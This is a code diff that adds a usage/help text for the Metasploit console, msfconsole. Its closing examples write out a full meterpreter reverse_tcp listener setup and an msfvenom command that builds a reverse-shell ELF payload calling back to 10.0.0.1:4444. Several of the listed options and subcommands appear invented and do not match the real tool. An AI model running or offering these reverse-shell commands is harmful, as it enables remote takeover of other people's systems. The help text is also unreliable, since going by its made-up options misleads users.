@@ -1,0 +1,28 @@
+Usage: msfconsole [options]
+  
+Start the Metasploit Framework console
+
+Options:
+  -h, --help              Show this help message
+  -q, --quiet             Quiet mode (suppress banner)
+  -r, --resource=FILE     Execute resource file
+  -x, --command=CMD       Execute command
+  -o, --output=FILE       Output to file
+  -L, --log=FILE          Log output to file
+  -v, --verbose           Verbose output
+  -d, --database=DB       Database backend
+  -c, --config=FILE       Config file
+  -a, --analyze           Analyze module
+  -e, --environment=NAME  Environment
+  -m, --module-path=DIR   Module path
+
+Subcommands:
+  console                 Start interactive console
+  start                   Start msfconsole in background
+  stop                    Stop msfconsole
+  status                  Check status
+
+Example:
+  msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit"
+  msfconsole -q -r /path/to/resource.rc
+  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf
